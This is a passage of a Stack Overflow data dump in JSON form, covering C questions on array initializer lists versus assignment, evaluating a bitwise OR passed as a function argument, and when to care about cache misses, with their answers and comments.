1499253046, "answer_id": 44924629, "question_id": 44924320, "link": "https://stackoverflow.com/questions/44924320/what-happens-in-the-background-of-array-initialization-in-c/44924629#44924629", "title": "What happens in the background of array initialization in c?", "body": "<p>Initialization and assignment are fundamentally different things. As for the language C, you just have to accept the fact that they are distinguished, but of course, there's a technical reason it's defined this way:</p>\n\n<p>In many systems, you can have a <em>data segment</em> in your executable file. This segment could be read/write and given an initialized array like</p>\n\n<pre><code>uint8_t foo[] = {1, 2, 3, 4}; // assume this has static storage duration\n</code></pre>\n\n<p>the compiler could just decide to output this exact byte sequence directly into your executable. So there's <strong>no code at all</strong> doing an assignment, the data is already there in memory when your program starts.</p>\n\n<hr>\n\n<p>OTOH, arrays cannot be assigned to (only their individual members). That's how C is defined, and it's sometimes unfortunate.</p>\n"}, {"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 3, "last_activity_date": 1499253629, "last_edit_date": 1499253629, "creation_date": 1499253241, "answer_id": 44924702, "question_id": 44924320, "link": "https://stackoverflow.com/questions/44924320/what-happens-in-the-background-of-array-initialization-in-c/44924702#44924702", "title": "What happens in the background of array initialization in c?", "body": "<p><code>{1,2,3,4}</code> is an initializer list. It an be used to specify the initial value of an object with at least 4 elements, be they array elements or structure members including those of nested objects.</p>\n\n<p>You cannot use this syntax to assign values to an array as this:</p>\n\n<pre><code>bytes2 = {1,2,3,4};\n</code></pre>\n\n<p>Because the syntax is not supported, and arrays are not lvalues.</p>\n\n<p>You can use intializer lists as part of a C99 syntax known as compound literals to create objects and use them as rvalues for assignment, return values or function arguments:</p>\n\n<pre><code>struct quad { int x, y, z, t; };\n\nstruct quad p;\np = (struct quad){1,2,3,4};\n</code></pre>\n\n<p>You still cannot use this for arrays because they are not lvalues, but you can achieve the same effect with a call to <code>memcpy()</code>:</p>\n\n<pre><code>uint8_t bytes2[4];\nmemcpy(bytes2, (uint8_t[4]){1,2,3,4}, sizeof(bytes2));\n</code></pre>\n\n<p>This statement is compiled by <code>clang</code> as a single intel instruction as can be seen on <a href=\"https://godbolt.org/g/nFutFU\" rel=\"nofollow noreferrer\">Godbolt's Compiler Explorer</a></p>\n"}, {"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499253775, "post_id": 44924833, "comment_id": 76825010, "body": "UV&#39;d. You might want to add that <code>array_t bytes = { .data = {1,2,3,4} };</code>, <code>array_t bytes = {{1,2,3,4}};</code> and <code>array_t bytes = {1,2,3,4};</code> are all equivalent."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499253886, "post_id": 44924833, "comment_id": 76825079, "body": "@chqrlie Sure... but the first is most explicit and self-documenting. The second is old-style C90 and the 3rd is questionable style (although it will work). Many compilers give a warning for the 3rd version."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1499254129, "post_id": 44924833, "comment_id": 76825269, "body": "your remarks are perfectly correct, and I would not use the third for the very reason you mention, but the second has the advantage of portability to environments that do not support the C99 syntax, including many C++ compilers."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1499255782, "post_id": 44924833, "comment_id": 76826459, "body": "Are you sure that &quot;token&quot; is the right word here?  Normally a token is an indivisible atom of lexing, whereas an initiliazer-list is built of tokens like an expression."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1499257984, "post_id": 44924833, "comment_id": 76828127, "body": "@TobySpeight No I&#39;m not sure but I don&#39;t think it matters unless the OP is making a compiler. Formally, an <i>initializer-list</i> is part of an <i>initializer</i> which is part of an <i>init-declarator</i> which is part of an <i>init-declarator-list</i>, which is part of a <i>declaration</i>. So what, this is not something that the average programmer needs to know."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1499259070, "post_id": 44924833, "comment_id": 76829018, "body": "Kindly do not copy parts of other answers into mine, particularly with no attribution given - makes it look as if the text is stolen. It is perfectly fine to have several answers posted that complement each other. Just up-vote all useful answers and mark the most useful one as accepted."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1500077654, "post_id": 44924833, "comment_id": 77197875, "body": "To be exact, <code>{1,2,3,4}</code> is not initializer list. <code>1,2,3,4</code> is initializerlist in this case. The whole thing - <code>{1,2,3,4}</code> - is a <i>brace enclosed initializer list</i>."}], "tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": true, "score": 7, "last_activity_date": 1499258992, "last_edit_date": 1499258992, "creation_date": 1499253651, "answer_id": 44924833, "question_id": 44924320, "link": "https://stackoverflow.com/questions/44924320/what-happens-in-the-background-of-array-initialization-in-c/44924833#44924833", "title": "What happens in the background of array initialization in c?", "body": "<p><code>{1,2,3,4}</code> is an <em>initializer-list</em>, a particular syntax token that can only be used on the line where the array is declared.</p>\n\n<p>This is regulated purely by the C standard syntax. There's no particular rationale behind it, this is just how the language is defined. In the C syntax, arrays cannot be assigned to, nor copied by assignment.</p>\n\n<p>You can however dodge the syntax restrictions in several ways, to overwrite all values at once. The simplest way is just to create a temporary array and memcpy:</p>\n\n<pre><code>uint8_t tmp[] = {5,6,7,8};\nmemcpy(bytes, tmp, sizeof bytes);\n</code></pre>\n\n<p>Alternatively, use a compound literal:</p>\n\n<pre><code>memcpy(bytes, (uint8_t[]){5,6,7,8}, sizeof bytes);\n</code></pre>\n\n<p>If it makes sense for the specific application, you can also wrap the array in a struct to bypass the syntax restrictions:</p>\n\n<pre><code>typedef struct\n{\n  uint8_t data [4];\n} array_t;\n\n...\n\narray_t bytes = { .data = {1,2,3,4} };\narray_t tmp   = { .data = {5,6,7,8} };\nbytes = tmp; // works just fine, structs can be copied this way\n</code></pre>\n"}], "owner": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 181, "favorite_count": 0, "accepted_answer_id": 44924833, "answer_count": 4, "score": 5, "last_activity_date": 1500077193, "creation_date": 1499252201, "last_edit_date": 1500077193, "question_id": 44924320, "link": "https://stackoverflow.com/questions/44924320/what-happens-in-the-background-of-array-initialization-in-c", "title": "What happens in the background of array initialization in c?", "body": "<p>Given that this is legal</p>\n\n<pre><code>uint8_t bytes[4] = { 1, 2, 3, 4 };\n</code></pre>\n\n<p>And this is not:</p>\n\n<pre><code>uint8_t bytes2[4];\nbytes2 = { 1, 2, 3, 4 };\n</code></pre>\n\n<p>what does <code>{ 1, 2, 3, 4 }</code> represent?</p>\n\n<p>Am assuming it's neither an rvalue or an lvalue. A preprocessor code candy that expands to something?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 5868, "user_id": 3270037, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6HVI4.png?s=128&g=1", "display_name": "Nick", "link": "https://stackoverflow.com/users/3270037/nick"}, "edited": false, "score": 1, "creation_date": 1499252136, "post_id": 44924254, "comment_id": 76823906, "body": "<code>(0x1 | 0x3) == 0x3</code> so <code>0x3</code> (or just <code>3</code>) will be used surely?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user6385115"}, "reply_to_user": {"reputation": 1924, "user_id": 2669042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c66a47707c3d1748c9977727ddfa4d50?s=128&d=identicon&r=PG", "display_name": "xing", "link": "https://stackoverflow.com/users/2669042/xing"}, "edited": false, "score": 0, "creation_date": 1499252488, "post_id": 44924254, "comment_id": 76824163, "body": "@xing it depends on what the function expects as argument, bool (true or false) or for example int . So if it expects bool, I will get true from this operation and if expects int I will get 0x3. Also it depends on operator type: logical or bitwise as dasblinkenlight provided in his answer."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 2, "creation_date": 1499252583, "post_id": 44924254, "comment_id": 76824226, "body": "I added the c++ tag since it spawned an interesting discussion about differences between the 2 language cousins."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499253102, "post_id": 44924254, "comment_id": 76824583, "body": "@chqrlie: Yes, now I&#39;ve had to put some more meat in my answer."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499255583, "post_id": 44924254, "comment_id": 76826304, "body": "What&#39;s <code>void func((0x1 | 0x3))</code>even supposed to mean? It is not valid syntax. And what do you mean &quot;return value&quot;? Return where? From a function returning <code>void</code>? Just... what? I have no idea what you are asking and I have no idea how the posted answers have any relevance to &quot;Passing bitwise operation as argument to function in C&quot;."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499257323, "post_id": 44924254, "comment_id": 76827600, "body": "That&#39;s not even related to parameters. It is a simple expression. Why did you not look it up yourself? What was unclear?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user6385115"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499263886, "post_id": 44924254, "comment_id": 76832715, "body": "@Olaf Yes it is expression, but a result of it will be passed as argument to function. I think it is clear for what I am asking in main post."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499264377, "post_id": 44924254, "comment_id": 76833175, "body": "@Lazar: Get a better C book. what you do with the result of the expression is <b>completely</b> irrelevant. If your problem is not related to the operator, provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> and learn <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user6385115"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499265918, "post_id": 44924254, "comment_id": 76834395, "body": "@Olaf Ok, I will try to be more clear next time."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499266620, "post_id": 44924254, "comment_id": 76835037, "body": "It would be better to do at least <i>some</i> research before you ask."}], "answers": [{"comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1499252288, "post_id": 44924302, "comment_id": 76824020, "body": "I&#39;ve added that. A small but important difference between the two languages for the pub quiz."}, {"owner": {"reputation": 5868, "user_id": 3270037, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6HVI4.png?s=128&g=1", "display_name": "Nick", "link": "https://stackoverflow.com/users/3270037/nick"}, "edited": false, "score": 0, "creation_date": 1499252298, "post_id": 44924302, "comment_id": 76824028, "body": "@chqrlie C doesn&#39;t have a bool type, whereas C++ does, so in C it returns a truthy value whereas C++ actually returns <code>true</code>"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 5868, "user_id": 3270037, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6HVI4.png?s=128&g=1", "display_name": "Nick", "link": "https://stackoverflow.com/users/3270037/nick"}, "edited": false, "score": 3, "creation_date": 1499252367, "post_id": 44924302, "comment_id": 76824080, "body": "@NickA: technically, C has a boolean type since C99, but the logical operators still evaluate to an <code>int</code> type."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499252388, "post_id": 44924302, "comment_id": 76824088, "body": "@chqrlie: That&#39;s the one."}, {"owner": {"reputation": 5868, "user_id": 3270037, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6HVI4.png?s=128&g=1", "display_name": "Nick", "link": "https://stackoverflow.com/users/3270037/nick"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499252457, "post_id": 44924302, "comment_id": 76824136, "body": "@chqrlie ahhh technicalities"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499252485, "post_id": 44924302, "comment_id": 76824161, "body": "The <code>||</code> operator has different semantics in Javascript, where the result has the type and value of the left operand if it evaluates to true and the type and value of the right operand otherwise. This is very useful and <code>gcc</code> has an extension with similar semantics: <code>x = y ?: z</code>;"}], "tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": true, "score": 2, "last_activity_date": 1499253253, "last_edit_date": 1499253253, "creation_date": 1499252140, "answer_id": 44924302, "question_id": 44924254, "link": "https://stackoverflow.com/questions/44924254/passing-bitwise-operation-as-argument-to-function-in-c/44924302#44924302", "title": "Passing bitwise operation as argument to function in C", "body": "<p><code>0x1 | 0x3</code> is a compile-time evaluable constant expression: it's an <code>int</code> type with the value 3.</p>\n\n<p>If you were thinking of the <code>||</code> operator, then in C, the value of <code>0x1 || 0x3</code> is an <code>int</code> type with the value 1 as evaluation of <code>||</code> stops at the first non-zero argument. This short-circuiting property also applies to C++ but here the type would be <code>bool</code> with the value <code>true</code> and you have to take extra care if <code>func</code> is overloaded<sup>1</sup>:</p>\n\n<pre><code>void func(int)\n{\n    // pay me a bonus\n}\n\n#ifdef __cplusplus\nvoid func(const bool&amp;)\n{\n    // reformat my hard disk\n}\n#endif\n</code></pre>\n\n<p><hr>\n<sup>1</sup>C++ allows functions to be overloaded, C doesn't. Yet another important difference.</p>\n"}, {"tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": false, "score": 3, "last_activity_date": 1499252167, "creation_date": 1499252167, "answer_id": 44924312, "question_id": 44924254, "link": "https://stackoverflow.com/questions/44924254/passing-bitwise-operation-as-argument-to-function-in-c/44924312#44924312", "title": "Passing bitwise operation as argument to function in C", "body": "<p>Since you used only one pipe, the result is bitwise OR, not a logical OR:</p>\n\n<pre><code>0x01 | 0x03  ---&gt; 0x03\n</code></pre>\n\n<p>Logical OR uses two pipes:</p>\n\n<pre><code>0x01 || 0x03 ---&gt; 1\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "is_accepted": false, "score": 0, "last_activity_date": 1499281566, "last_edit_date": 1499281566, "creation_date": 1499252211, "answer_id": 44924326, "question_id": 44924254, "link": "https://stackoverflow.com/questions/44924254/passing-bitwise-operation-as-argument-to-function-in-c/44924326#44924326", "title": "Passing bitwise operation as argument to function in C", "body": "<p><code>|</code> is the bitwise operation so the result will be <code>3</code></p>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 0, "last_activity_date": 1499257851, "creation_date": 1499257851, "answer_id": 44926364, "question_id": 44924254, "link": "https://stackoverflow.com/questions/44924254/passing-bitwise-operation-as-argument-to-function-in-c/44926364#44926364", "title": "Passing bitwise operation as argument to function in C", "body": "<p>From a boolean perspective, a value of 0 is false and any non-zero value is evaluated as true.</p>\n\n<p>Because you're using the bitwise-OR operator <code>|</code>, the expression <code>(0x1 | 0x3)</code> has the value 0x3:</p>\n\n<pre><code>  00000001 = 0x1\n| 00000011 = 0x3\n----------\n  00000011 = 0x3\n</code></pre>\n\n<p>If this value is passed to a function expecting a <code>_Bool</code> (or equivalently <code>bool</code>), it is converted as per section 6.3.1.2 of the <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">C standard</a>:</p>\n\n<blockquote>\n  <p>When any scalar value is converted to <code>_Bool</code>, the result is 0 if the\n  value compares equal to 0; otherwise, the result is 1.</p>\n</blockquote>\n\n<p>If the function is expecting an <code>int</code>, the value is not converted.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user6385115"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 314, "favorite_count": 0, "accepted_answer_id": 44924302, "answer_count": 4, "score": 2, "last_activity_date": 1499281566, "creation_date": 1499252007, "last_edit_date": 1499257287, "question_id": 44924254, "link": "https://stackoverflow.com/questions/44924254/passing-bitwise-operation-as-argument-to-function-in-c", "title": "Passing bitwise operation as argument to function in C", "body": "<p>What will be the argument value if we call function with the following argument</p>\n\n<pre><code>void func((0x1 | 0x3))\n</code></pre>\n\n<p>Is it true that if the result of this operation is >0 it gives true, and for the opposite it gives false, or we get 0x3 as a return value of this operation?</p>\n"}, {"tags": ["c", "caching", "vim"], "comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 3, "creation_date": 1499248304, "post_id": 44922687, "comment_id": 76821095, "body": "Are you coding a real <a href=\"https://en.wikipedia.org/wiki/Source_code_editor\" rel=\"nofollow noreferrer\">source code editor</a> (then performance don&#39;t matter as much) or what is your library really doing? Why is it so performance critical? Did you <i>benchmark it</i> (with optimizations enabled at compile time) and <i>profile it</i> ? Please <b>edit your question</b> to explain more the real motivation and what application do you have in mind."}, {"owner": {"reputation": 80047, "user_id": 169346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645dbb4f7ba1ff9d7ff2de02f68fbe9c?s=128&d=identicon&r=PG", "display_name": "JeremyP", "link": "https://stackoverflow.com/users/169346/jeremyp"}, "edited": false, "score": 1, "creation_date": 1499249602, "post_id": 44922687, "comment_id": 76822081, "body": "Organise your code in the way that makes it most understandable and easy to maintain. Unless your code is executed very frequently e.g. 60 times a second because it has to be done for every graphics frame, the time you save over the whole life of the program by optimising for the instruction cache is likely to be less <i>in total</i> than the time you spend doing the optimising and subsequent extra maintenance time. For example, if you shave a microsecond off by spending an hour optimising, your code has to execute 3.6 billion times to get that hour back."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "reply_to_user": {"reputation": 80047, "user_id": 169346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645dbb4f7ba1ff9d7ff2de02f68fbe9c?s=128&d=identicon&r=PG", "display_name": "JeremyP", "link": "https://stackoverflow.com/users/169346/jeremyp"}, "edited": false, "score": 1, "creation_date": 1499251271, "post_id": 44922687, "comment_id": 76823293, "body": "What @JeremyP says, plus it&#39;s actually worse than that.  In order to avoid an optimization attempt having a negative effect in future, you may well have to retest with every new version of the compiler, OS, hardware environment etc, so Jeremy&#39;s example &#39;standard hour&#39; of design/test/debug/measure has to be continually repeated :("}, {"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 1, "creation_date": 1499255577, "post_id": 44922687, "comment_id": 76826296, "body": "Why is this tagged C++? <code>void vi_dw(struct vi *vi);</code> is clearly C, in C++ it would have been <code>void vi::dw( )</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499262544, "post_id": 44922687, "comment_id": 76831706, "body": "Don&#39;t spam tags! C++ is not C."}], "answers": [{"comments": [{"owner": {"reputation": 707, "user_id": 5413164, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/97914965b4454c77a6c2891a9a4435cc?s=128&d=identicon&r=PG&f=1", "display_name": "weiweishuo", "link": "https://stackoverflow.com/users/5413164/weiweishuo"}, "edited": false, "score": 0, "creation_date": 1499252279, "post_id": 44922896, "comment_id": 76824015, "body": "Thanks.  Maybe what I want to know is not how to optimize it, but how others will handle such case. Your &quot; I won&#39;t care&quot;  is also a good reply for me.  PS: I updated this library&#39;s application situations in <i>item 4</i> in the post end."}], "tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": false, "score": 12, "last_activity_date": 1499253739, "last_edit_date": 1499253739, "creation_date": 1499248600, "answer_id": 44922896, "question_id": 44922687, "link": "https://stackoverflow.com/questions/44922687/when-should-we-care-about-cache-missing/44922896#44922896", "title": "when should we care about cache missing?", "body": "<p>I won't care that much about cache misses (especially in your case), unless your <em>benchmarks</em> (with compiler optimizations enabled, i.e. compile with <code>gcc -O2 -mtune=native</code> if using <a href=\"http://gcc.gnu.org/\" rel=\"nofollow noreferrer\">GCC</a>....) indicate that they matter.</p>\n\n<p>If performances matters that much, enable more optimizations (perhaps compiling and <em>linking</em> your entire application or library with <code>gcc -flto -O2 -mtune=native</code> that is with link-time optimizations), and hand-optimize only what is critical. You should <strong>trust your <a href=\"https://en.wikipedia.org/wiki/Optimizing_compiler\" rel=\"nofollow noreferrer\">optimizing compiler</a></strong>.</p>\n\n<p>If you are in the design phase, consider perhaps making your application multi-threaded or somehow concurrent and parallel. With care, this could speedup it more than cache optimizations.</p>\n\n<p>It is unclear what your library is about and what are your design goals. A possibility to add flexibility might be embed some interpreter (like <a href=\"http://lua.org/\" rel=\"nofollow noreferrer\">lua</a> or <a href=\"https://www.gnu.org/software/guile/\" rel=\"nofollow noreferrer\">guile</a> or <a href=\"https://docs.python.org/3/extending/index.html\" rel=\"nofollow noreferrer\">python</a>, etc...) in your application, hence configuring it thru scripts. In many cases, such an embedding could be fast enough (especially when the application specific primitives are of high enough level). Another (more complex) possibility is to provide <a href=\"https://en.wikipedia.org/wiki/Metaprogramming\" rel=\"nofollow noreferrer\">metaprogramming</a> abilities perhaps thru some <a href=\"https://en.wikipedia.org/wiki/Just-in-time_compilation\" rel=\"nofollow noreferrer\">JIT compiling</a> library like <a href=\"https://www.gnu.org/software/libjit/\" rel=\"nofollow noreferrer\">libjit</a> or <a href=\"https://gcc.gnu.org/onlinedocs/jit/\" rel=\"nofollow noreferrer\">libgccjit</a> (so you would sort-of \"compile\" user scripts into dynamically produced machine code).</p>\n\n<p>BTW, your question seems to focus on instruction cache misses. I would believe that data cache misses are more important (and less optimizable by the compiler), and that is why you would prefer e.g. vectors to linked lists (and more generally care about low-level data structures, focusing on using sequential -or cache-friendly- accesses)</p>\n\n<p><sup>(you could find a good video by Herb Sutter which explains that last point; I forgot the reference)</sup></p>\n\n<p>In some very specific cases, with recent <a href=\"http://gcc.gnu.org/\" rel=\"nofollow noreferrer\">GCC</a> or <a href=\"http://clang.llvm.org/\" rel=\"nofollow noreferrer\">Clang</a>, adding a few <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Other-Builtins.html#Other-Builtins\" rel=\"nofollow noreferrer\"><code>__builtin_prefetch</code></a> might <em>slightly</em> improve performance (by decreasing cache misses), but it could also harm it significantly, so <em>I don't recommend using it</em> in general, but see <a href=\"https://stackoverflow.com/a/29203501/841108\">this</a>.</p>\n"}], "owner": {"reputation": 707, "user_id": 5413164, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/97914965b4454c77a6c2891a9a4435cc?s=128&d=identicon&r=PG&f=1", "display_name": "weiweishuo", "link": "https://stackoverflow.com/users/5413164/weiweishuo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 618, "favorite_count": 0, "answer_count": 1, "score": 7, "last_activity_date": 